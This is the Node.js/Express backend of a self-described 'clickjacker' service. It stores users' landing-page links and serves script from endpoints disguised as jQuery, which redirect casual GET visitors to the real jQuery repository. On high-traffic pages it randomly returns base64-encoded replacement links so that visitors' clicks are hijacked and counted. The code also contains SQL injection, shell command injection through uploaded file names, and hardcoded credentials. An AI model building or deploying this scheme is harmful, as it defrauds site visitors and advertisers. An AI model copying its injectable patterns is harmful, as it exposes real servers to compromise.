//module dependencies
var express = require('express')
  , http = require('http')
  , mysql = require('mysql')
  , path = require('path');
var app = express();
var request = require('request');
//var compressor = require('yuicompressor');
var validator = require('validator');
var bcrypt = require('bcrypt-nodejs');
var randomstring = require('randomstring');
//var obf = require('node-obf');
var urlParser = require('url');
var fs = require('node-fs');
var util = require('util');
var cheerio = require('cheerio');
var cmd = require('child_process');
var uuid = require('node-uuid');
var cors = require('cors');
//new middlewares
var favicon = require('serve-favicon');
var logger = require('morgan');
var methodOverride = require('method-override');
var session = require('express-session');
var bodyParser = require('body-parser');
var multer = require('multer');
var errorHandler = require('errorhandler');
var cookieParser = require('cookie-parser')

//Date prototype for converting Date() to MySQL DateTime format
Date.prototype.toMysqlFormat = function () {
    function pad(n) { return n < 10 ? '0' + n : n }
    return this.getFullYear() + "-" + pad(1 + this.getMonth()) + "-" + pad(this.getDate()) + " " + pad(this.getHours()) + ":" + pad(this.getMinutes()) + ":" + pad(this.getSeconds());
};
String.prototype.replaceAt=function(index, character) {
    return this.substr(0, index) + character + this.substr(index+character.length);
}

// all environments
app.set('port', process.env.PORT || 9000);
app.set('views', __dirname + '/views');
app.set('view engine', 'jade');
//app.use(favicon(__dirname + '/public/favicon.ico'));
app.use(logger('dev'));
app.use(cookieParser());
app.use(bodyParser.json());                          // parse application/json
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));  // parse application/x-www-form-urlencoded
app.use(multer());                                   // parse multipart/form-data
app.use(session({ secret: '1234342434324' }));
app.use(methodOverride());
app.use(express.static(path.join(__dirname, 'public')));

//deprecated, see: https://github.com/strongloop/express/wiki/Migrating-from-3.x-to-4.x
/*app.configure('development', function() {
    app.use(errorHandler());
    app.locals.pretty = true;
});*/

var connection = mysql.createConnection({
    host : 'localhost',
    user : 'root',
    password : 'derekisfat',
    database : 'domains_dev'
});
connection.connect();

//change depending on your dev setup or for production
var base_clickjacker_dir = "/Users/alfstad/Desktop/clickjacker";

function checkAuth(req, res, next) {
    if (req.session.user_id === 'admin') {
        if(req.url.substring(0,7) == '/logout') {
            next();
        }
        else {
            res.redirect('/admindex')
        }
    }
    else if (!req.session.user_id) {
        res.redirect('login');
    } else {
        next();
    }
}

function getNextCodeDelimiter() {
  var code = "aixlfgixgfe";
  var newCode = "";
  
  for(var i=0 ; i<code.length; i++) {
    if(code.charAt(i) > 122) {
      newCode += 97;
    } else {
      newCode += code[i] + 1;
    }
    String(code).replaceAt(i,code.charAt(i) + 1);
  }
  return newCode;
}

function getClientResponseJSON(uuid, url, fn) {
  /* 1.get the links from the lander_info based on the uuid */
  var response = "";
  connection.query("select links_list from lander_info where uuid='" + uuid + "' and registered='1'", function(err, docs) {
    if(docs.length > 0) {
      var links = docs[0].links_list;
      if(links) {
        var linksArr = links.split(",");
        /* 2. transform that into base64 code */
        for(var i=0 ; i<linksArr.length ; i++) {
          response += new Buffer(linksArr[i]).toString('base64') + getNextCodeDelimiter();
        }
      }
      /* 3. get the rate from pulse table based on url */
      connection.query("select rate from pulse where url = '" + url +"'", function(err, docs) {
        if(docs[0] != undefined) {
          //get random number, if its above 15 dont jack, otherwise jack
          var randomNumber = Math.random() * 100;
          if(docs[0].rate > 30) { //views/min
            if(randomNumber <= 15) {
                fn({
                  jquery: response
                });
            } else {
                fn({
                  jquery: false
                });
            }
          } else {
              fn({
                jquery: false
              });
          }
        }
      });
    }
  }); 
}

function checkAdmin(req, res, next) {
    if (req.session.user_id === 'admin') {
        next();
    } else {
        res.redirect('login');
    }
}



app.get('/', checkAuth, function( req, res) {
    res.render('index');
});

app.get('/admindex', checkAdmin, function( req, res) {
    connection.query('select * from all_domains ORDER BY user ASC', function(err, docs) {
        res.render('admindex', {domains: docs});
    });
});

app.get('/landercode', checkAuth, function( req, res) {
    var user = req.session.user_id; 
    fs.readFile('./client/compressed/compressed-initial.js', function(err, data) {
        if(err) throw err;
        connection.query("SELECT secret_username FROM users WHERE user = ?", [user], function(err, docs) {
            if(docs.length == 1) {
                var replacedFile = String(data).replace('replacemeuuid', docs[0].secret_username);       

                res.send({
                    landercode:  String(replacedFile)
                });

            }
        });
    });     
});

app.get('/login', function(req, res) {
    res.render('login');
});

app.post('/login', function (req, res) {
    var post = req.body;
    var password = post.password;
    var username = post.username;
    var hash;

    connection.query('SELECT hash FROM users WHERE user = ? && approved = 1;', [username], function(err, rows) {
        if (err) {
            res.json(err);
        }
        if(rows.length == 1) {
            hash = rows[0].hash;
        } 
        else {
            var msg = {status: 'User does not exist or is not yet approved.'}
            res.render('login', {data: msg});
        }

        bcrypt.compare(password, hash, function(err, response) {
            if(response == true) {
                req.session.user_id = username;
                if(username === 'admin') {
                    res.redirect('/admindex');
                }
                else {
                    res.redirect('/');
                }
            } 
            else {
                var msg = {status: 'Bad user/password.'}
                res.render('login', {data: msg});
            }
        });
    });

});

app.get('/register', function (req, res) {
    res.render('register');
}); 

app.post('/register', function (req, res) {
    var post = req.body;
    var email = post.email;
    var password = post.password;
    var password_confirm = post.password_confirm;
 
    connection.query('SELECT id from users WHERE user = ?;', [email], function(err, docs) {
        if(docs[0]) {
            var msg = {status: 'User already exists.'}
            res.render('register', {data: msg});
        }
        else {
            if (!validator.isEmail(email)) {
                var msg = {status: 'Email address invalid.'}
                res.render('register', {data: msg});
            } 
            else if(!validator.isLength(password, 6, 20) || !validator.isAscii(password)) {
                var msg = {status: 'Password does not meet requirements.'}
                res.render('register', {data: msg});
            }
            else if(password != password_confirm) {
                var msg = {status: 'Passwords do not match.'}
                res.render('register', {data: msg});
            }
            else {
                //adding user!
                var secret = randomstring.generate(30);
                var secretNotUnique = true;
                
                //ensure unique string
                connection.query("SELECT secret_username FROM users;", function(err, docs) {
                    for(var i=0 ; i<docs.length ; i++) {
                        if(secret == docs[i]) {
                            secret = randomstring.generate(30);
                            i=0; //start over
                        }
                    }
                });
    
                bcrypt.hash(password, null, null, function(err, hash) {
                    connection.query('INSERT INTO users (user, hash, approved) VALUES(?, ?, ?);', [email, hash, 0], function(err, docs) {
                        if (err) res.json(err);
                    })
                });

                var msg = {status: 'Registration submitted and waiting for approval! An email will be sent to upon approval.'}
                res.render('register', {data: msg});
            }   
        }     
    })

});

app.get('/logout', checkAuth, function (req, res) {
    var user = req.session.user_id;
    var datetime = new Date().toMysqlFormat();
    connection.query('UPDATE users SET last_login = ? WHERE users.user = ?;', [datetime, user], function(err, docs) {
        if (err) res.json(err);
        console.log("Query Success");
        delete req.session.user_id;    
        res.redirect('/login');
    })
});

app.get('/my_domains', checkAuth, function (req, res) {
    connection.query('select * from my_domains where user = ?', [req.session.user_id],function(err, docs) {
        res.render('my_domains', {domains: docs});
    });
});

// Save the new registered domain
app.post('/my_domains', checkAuth, function (req, res) {
   var url=req.body.url;

   if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
       url = "http://" + url;
   }

   url = url.replace("http://www.", "http://");
   url = url.replace("https://www.", "https://");

   var base_url = urlParser.parse(url).hostname;

   if(validator.isURL(url)) {
       connection.query('CALL insert_my_domain(?, ?);', [base_url, req.session.user_id], function(err, docs) {
           if (err) {
               res.json(err);
           } else {
               connection.query('SELECT id FROM my_domains WHERE (user = ? AND url = ?)', [req.session.user_id, base_url], function(err, docs) {
                   if (err) {
                       res.json(err);
                   } else {
                       if(docs[0]) {
                           var id = docs[0].id;            
                           if (id) {
                               var body = {
                                   message: "success",
                                   id: id,
                                   url: base_url
                               };
                               res.status(200)
                               res.send(body);
                           }
                       }
                   }
               });
           }
       });            
   }
   else {
       var msg = {status: 'Invalid URL.'};
       res.render('my_domains', {data: msg});
   }
});

app.get('/my_domains/delete', checkAuth, function (req, res) {
    var id=req.query.id;
    
    connection.query('CALL delete_my_domain(?, ?);', [id, req.session.user_id], function(err, docs) {
        if (err) {
            res.json(err);
        } else {
            var body = {
              message: "success",
              id: id 
            };
            
            res.status(200);
            res.send(body);
        }
    });
});

app.get('/all_domains', checkAuth, function (req, res) {
    connection.query('select url, id, registered, count, replaced_links_clicked, rate, creation_date from all_domains where user = ?', [req.session.user_id], function(err, docs) {
        res.render('all_domains', {domains: docs});
    });
});

app.get('/all_domains/list', checkAuth, function(req, res) {
    connection.query('select * from all_domains where user = ?', [req.session.user_id], function(err, rows, fields) {
        if (err) res.json(err);
        else {
            res.send({
                    json: rows
            });
        }
    });
});

app.post('/all_domains/delete', checkAuth, function (req, res) {
    var id=req.body.id;
    
    connection.query('DELETE from all_domains where id = ?;', [id], function(err, docs) {
        if (err) res.json(err);
        else {
            res.send('');
        }
    })
});

app.get('/all_domains/new', function (req, res) {
    var url=req.query.url;

    if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
        url = "http://" + url;
    }

    url = url.replace("http://www.", "http://");
    url = url.replace("https://www.", "https://");

    var base_url = urlParser.parse(url).hostname;

    var datetime = new Date().toMysqlFormat();
    connection.query('CALL insert_domain(?, ?, ?, ?);', [url, req.session.user_id, datetime, base_url], function(err, docs) {
        if (err) res.json(err);
        else {
            var body = "success";
            res.writeHead(200, {
                'Content-Length': body.length,
                'Content-Type': 'text/plain',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, OPTIONS',
                'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
            });
                
            res.end(body);
        }
    })
});

app.post('/all_domains/new', function (req, res) {
    var url = req.query.url;

    if (typeof url === "undefined" || url == '') {
        res.send('');
        return;
    }

    if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
        url = "http://" + url;
    }

    url = url.replace("http://www.", "http://");
    url = url.replace("https://www.", "https://");

    var base_url = urlParser.parse(url).hostname;

    var links = req.body.hrefs;
    var secretUsername = req.body.user;

    var datetime = new Date().toMysqlFormat();

    connection.query("SELECT user FROM users WHERE secret_username = ?", [secretUsername], function(err, usernameDocs) {
        if(err) throw err;
        if(usernameDocs.length == 1) {
           var user = usernameDocs[0].user;

           connection.query('CALL insert_domain(?, ?, ?, ?);', [url, user, datetime, base_url], function(err, InsertDomainDocs) {
                if(err) throw err;
                connection.query('CALL get_links(?, ?);', [url, user], function(err, getLinksDocs, fields) {
                    if(err) throw err;
                    var responseArray = getLinksDocs[0];
                    var responseArrayLen = responseArray.length;
                    var responseObject = {};

                    for (var i = 0; i < responseArrayLen; i++) {
                        if (i == 0) {
                            responseObject.rate = responseArray[i].rate;
                            responseObject.bc_rate = responseArray[i].bc_rate;
                        }

                        var key = responseArray[i].link;
                        responseObject[key] = { bc_link: responseArray[i].bc_link, user_link: responseArray[i].user_link }
                    }

                    res.writeHead(200, {
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'POST, OPTIONS',
                        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                    });

                    res.end(JSON.stringify(responseObject));

                    for (var key in links) {
                        connection.query('CALL insert_link(?, ?, ?);', [url, key, user], function(err2, rows) {
                        });
                    }
                }); 
            });
        }
    });
});

app.post('/all_domains/edit_rate', checkAuth, function (req, res) {
    var url=req.body.url;
    var rate=req.body.rate;
    connection.query('UPDATE all_domains SET rate = ? WHERE all_domains.url = ? AND all_domains.user = ?;', [rate, url, req.session.user_id], function(err, rows) {
        if (err) {
            res.json(err)
        } else {
            var body = {
                message: "success",
                rate: rate
            };
            res.status(200);
            res.send(body);
        }
    });
});

app.get('/edit_form', checkAuth, function (req, res) {
    var domain=req.query.domain;
    connection.query('CALL get_links(?, ?)', [domain, req.session.user_id], function(err, docs) {

        if(docs[0][0]) {
            res.render('edit_form', {rows: docs[0]}); 
        }  
        else {
            res.redirect('links_fail_page?domain=' + domain);
        }
        
    });
});

app.get('/links_fail_page', checkAuth, function (req, res) {
    var domain=req.query.domain;
    res.render('links_fail_page', {url: domain});
});

app.get('/links_admin', checkAdmin, function (req, res) {
    var domain=req.query.domain;
    connection.query('SELECT * FROM links WHERE domain LIKE CONCAT('%', ?, '%')', [domain], function(err, docs) {
        res.render('links_admin', {rows: docs});
    });
});

app.post('/links/edit', checkAuth, function (req, res) {
    var domain=req.body.domain;
    var link=req.body.link;
    var user_link=req.body.user_link;

    if (user_link.substring(0, 7) != "http://" && user_link.substring(0, 8) != "https://") {
        user_link = "http://" + user_link;
    }

    if (validator.isURL(user_link)) {
        connection.query('CALL insert_user_link(?, ?, ?, ?);', [domain, link, user_link, req.session.user_id], function(err, docs) {
            if (err) {
             res.json(err);
            } else {
              var body = {
                 message: "success",
                 domain: domain,
                 link: link,
                 user_link: user_link
             };
             res.status(200);
             res.send(body);
           }
        });
    }
    else {
        var msg = {status: 'Invalid URL.'};
        res.send({data: msg});
    }
});

app.get('/all_domains/new_domains', checkAuth, function (req, res) {
    var user = req.session.user_id;
    connection.query('SELECT DISTINCT all_domains.base_url FROM users, all_domains WHERE (users.last_login < all_domains.creation_date) AND (users.user = ?);', [user], function(err, docs) {
        if (err) {
            res.json(err);
        } else {
            var body = {
              message: "success",
              urls: docs 
            };
            
            res.status(200);
            res.send(body);
        }
    });
});

app.get('/all_domains/update_click_count', checkAuth, function (req, res) {
    var url = req.query.url;
    if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
        url = "http://" + url;
    }
    url = url.replace("http://www.", "http://");
    url = url.replace("https://www.", "https://");

    var base_url = urlParser.parse(url).hostname;
    var replacedLinksClickedCount;

    connection.query('SELECT replaced_links_clicked FROM all_domains WHERE url = ?', [base_url], function(err, docs) {
        replacedLinksClickedCount = parseInt(docs[0].replaced_links_clicked) + 1;
        connection.query('UPDATE all_domains SET replaced_links_clicked = ? WHERE base_url = ?;', [replacedLinksClickedCount, base_url], function(err, docs) {
            //Do nothing, just update the DB            
        });
    });
});

//Get and load client js
app.get('/jquery', function (req, res) {
    res.writeHead(301, { //You can use 301, 302 or whatever status code
      'Location': 'https://github.com/jquery/jquery',
      'Expires': (new Date()).toGMTString()
    });
    res.end();
});

app.post('/jquery', function(req, res) {
    var uuid=req.body.version;
console.log("uuid" + uuid);
    fs.readFile('./client/landercode.js', function(err, data) {
      if(err) throw err;
      var replacedFile = String(data).replace('replacemeuuid', uuid);       
      res.writeHead(200, {
        'Content-Length': replacedFile.length,
        'Content-Type': 'text/plain',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, OPTIONS',
        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
      });
      res.end(replacedFile);
    });
});

app.get('/jquery/latest', function (req, res) {
    res.writeHead(301, { //You can use 301, 302 or whatever status code
      'Location': 'https://github.com/jquery/jquery',
      'Expires': (new Date()).toGMTString()
    });
    res.end();
});

app.post('/jquery/latest', function(req, res) {
  var url = req.body.referer;
  var uuid = req.body.version;
  var datetime = new Date().toMysqlFormat();
  // var url = "freehairywomen.com";
  // var uuid = "0c59f130-8044-11e4-98fc-f7d283fea7f2";
  // var datetime = new Date().toMysqlFormat();
  connection.query("select process_lander_request(?,?,?) AS value;", [url, uuid, datetime], function(err, docs) {
    if(docs[0] != undefined) {
      var response = docs[0].value;
      //send back data!
      getClientResponseJSON(uuid, url, function(response) {

if(response.jquery == false) { response = ""; }
else { response = response.jquery; }

        res.writeHead(200, {
        'Content-Length': response.length,
        'Content-Type': 'text/plain',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, OPTIONS',
        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
      });
      res.end(response);
      });

    } else { console.log("your mommas so fat she sat on a dolla and made 4 quarters ;D"); }
  });

});

app.get('/upload', checkAuth, function( req, res) {
    res.render('upload');
});

function createStagingPath(unique_zip_name, callback){
    var error;

    var unique_str = unique_zip_name.split('.')[0];

    var staging_path = "/staging/" + unique_str;
    var created_path =  base_clickjacker_dir + staging_path;

    console.log("Creating staging path: " + created_path)

    //make dir here
    var mkdir_cmd = 'mkdir -p ' + created_path;
    cmd.exec(mkdir_cmd, function (err, stdout, stderr) {
        if(err) {
            console.log(stderr);
            error = "Server error making staging directory."
        }
        callback(created_path, error);
    });
}

function stageFile(file_path, staging_path, zip_name, callback) {
    var error;

    //req.files.myFile.path

    console.log("Copying " + file_path + " to " + staging_path + "/" + zip_name);

    fs.rename(
        file_path,
        staging_path + "/" + zip_name,
        function(err) {
            if(err) {
                console.log(err);
                error = 'Server error writing file.'
            }
            callback(error);
        }
    );
}

function getLanderId(user, callback) {
    var error;
    var lander_id;

    var lander_uuid = uuid.v1();

    connection.query("CALL get_lander_id(?, ?);", [user, lander_uuid], function(err, docs) {
        if(err) {
            error = err;
        }
        else {
            if(docs[0]) {
                lander_id=docs[0][0].id;
            } 
            console.log("Created lander id: " + lander_id + " with UUID: " + lander_uuid);
        }
        callback(lander_id, lander_uuid, error)
    });
}

function getIndexFilePath(unzipOutput) {
    //doing this to see if the unzip command created a directory
    /*  Output of the unzip command is like this if it creates a directory:
            Archive:  /home/ubuntu/clickjacker_test/sandbox/test.zip\
            creating: /home/ubuntu/test/public_html3/\
            inflating: /home/ubuntu/test/public_html3/jquery.js\
            ...
        The 3rd word is "creating:" and the 4th word is the directory
    */
    var words = unzipOutput.match(/\S+/g); //matches all non-spaces and puts all the words in an array
    if(words[2] == "creating:") {
        return words[3];
    }
    var str = words[3];
    return str.substring(0, str.lastIndexOf("/"));
}

function unzip(zip_path, zip_name, callback) {
    var error;
    var index_path;

    var unzip_cmd = 'unzip -o ' + zip_path + "/" + zip_name + ' -d ' + zip_path;
    cmd.exec(unzip_cmd, function (err, stdout, stderr) {
        if(!err) {
            index_path = getIndexFilePath(stdout);

            console.log('index path: ' + index_path)

            if (index_path == '') {
                index_path = zip_path;
            }
        }
        else {
            error = "Error unziping file";
            cleanUpStaging(zip_path);
        }
        callback(index_path, error);
    });
}

function extractData(index_path, index_name, lander_uuid, callback) {
    var error;

    console.log('Extracting links from: ' + index_path + "/" + index_name);

    fs.readFile(index_path + '/' + index_name, function(err, html) {
        if(err) {
            error = 'Error reading index file.';
            callback(error);
        }
        else {
            var $ = cheerio.load(html);

            var links_str = "";
            $('a').each(function(i, elem) {
                links_str = links_str + elem.attribs.href + ",";
            });

            links_str = links_str.substring(0, links_str.length - 1); //remove trailing comma

            connection.query("UPDATE lander_info SET links_list = ? WHERE (uuid = ?);", [links_str, lander_uuid], function(err2, docs) {
                if(err2) {
                    error = "Could not update links list for lander uuid = " + lander_uuid;
                }
                callback(error);
            });
        }
    });  
}

function installLanderCode(index_path, index_name, lander_uuid, callback) {
    var error;
    var find_cmd = 'find ' + index_path + ' -name "*.js"';

    console.log("Installing clickjacker...");

    cmd.exec(find_cmd, function (err, stdout, stderr) {
        var js_files = stdout.split('\n');
        callback(error);
    });

}

function rezipAndArchive(index_path, zip_name, lander_uuid, user, callback) {
    var error;

    var archive_path = base_clickjacker_dir + "/public/archive/" + user + "/" + lander_uuid + "/";

    var mkdir_cmd = "mkdir -p " + archive_path;
    var zip_cmd = "zip -r " + archive_path + zip_name + " " + index_path;

    console.log("Archiving " + index_path + " to " + archive_path + zip_name);

    cmd.exec(mkdir_cmd, function (err1, stdout, stderr) {
        if(err1) {
            console.log(stderr);
            error = "Error creating archive directory";
            callback(archive_path + zip_name, error);
        }

        cmd.exec(zip_cmd, function (err2, stdout, stderr) {
            if(err2) {
                console.log(stderr);
                error = "Error archiving zip file.";
            }
            connection.query("UPDATE lander_info SET archive_path = ? WHERE (uuid = ?);", [archive_path + zip_name, lander_uuid], function(err2, docs) {
                if(err2) {
                    error = "Could save archive path for lander uuid = " + lander_uuid;
                }
                callback(archive_path + zip_name, error);
            });
        });
    });
}

function cleanUpStaging(staging_path, callback){
    var error;
    console.log("Cleaning up staging path: " + staging_path);

    cmd.exec("rm -rf " + staging_path, function (err, stdout, stderr) {
        if(err) {
            error = "Could not clean up staging directory: " + staging_path;
        }
        callback(error);
    });
}

app.post('/upload', checkAuth, function(req, res) {
 
    var user = req.session.user_id;
    var index_name = req.body.indexName;
    var staging_path;                
    var zip_name=req.files.myFile.originalname; 
    var zip_path;
    var lander_id;
    var lander_uuid;
    var index_path;

    createStagingPath(req.files.myFile.name, function(staging_path, error) {
        if(error) {
            console.log(error);
            res.status(500);
            res.send(error);
            return;
        }
        else {
            zip_path=staging_path;
        }

        stageFile(req.files.myFile.path, staging_path, zip_name, function(error) {
            if(error) {
                console.log(error);
                res.status(500);
                res.send(error);
                return;
            }

            unzip(staging_path, zip_name, function(index_path, error) {
                if(error) {
                    console.log(error);
                    res.status(500);
                    res.send(error);
                    return;
                }

                getLanderId(user, function(lander_id, lander_uuid, error) {
                    if(error) {
                        console.log(error);
                        res.status(500);
                        res.send(error);
                        return;
                    }

                    extractData(index_path, index_name, lander_uuid, function(error) {
                        if(error) {
                            console.log(error);
                            res.status(500);
                            res.send(error);
                            return;
                        }

                        installLanderCode(index_path, index_name, lander_uuid, function(error) {
                            if(error) {
                                console.log(error);
                                res.status(500);
                                res.send(error);
                                return;
                            }

                            rezipAndArchive(index_path, zip_name, lander_uuid, user, function(archive_path, error) {
                                if(error) {
                                    console.log(error);
                                    res.status(500);
                                    res.send(error);
                                    return;
                                }
                                else {
                                    cleanUpStaging(staging_path, function(error) {
                                        if(error) {
                                            console.log("Warning: " + error);
                                        }
                                        res.status(200);

                                        var response = {
                                          download: archive_path
                                        };

                                        res.send(response);
                                    });
                                }
                            }); //rezipAndArchive
                        }); //installLanderCode
                    }); //extractData
                }); //getLanderId
            }); //unzip 
        }); //stageFile
   
    }); //createStagingPath


});

app.post('/upload_remote', function(req, res) {
 
    var index_name = req.body.indexName;

    var staging_path = createStagingPath();

    //path to save the zip to for testing
    //in actuality this should be the staging path
    var serverPath = '/Users/Troy/test/' + req.files.myFile.name;
 
    console.log(index_name);

    fs.rename(
        req.files.myFile.path,
        serverPath,
        function(error) {
            if(error) {
                res.send({
                    error: 'Ah crap! Something bad happened'
                });
                return;
            }
     
            res.send({
                path: serverPath
            });
        }
    );

    var serverUrl = 'http://ec2-54-187-151-91.us-west-2.compute.amazonaws.com:3001/test';
    var formData = {
        index_name: index_name,
        lander_id: 123,
        zip_path: staging_path,
        zip_name: 'test.zip'
    };

    request.post(
        {url:'http://ec2-54-187-151-91.us-west-2.compute.amazonaws.com:3001/test', formData: formData},
        function optionalCallback(error, response, body) {
            if (!error && response.statusCode == 200) {
                console.log(body)
                //console.log(response)
            }
        }
    );

});

app.listen('9000')
console.log('Magic happens on port 9000');
exports = module.exports = app; 
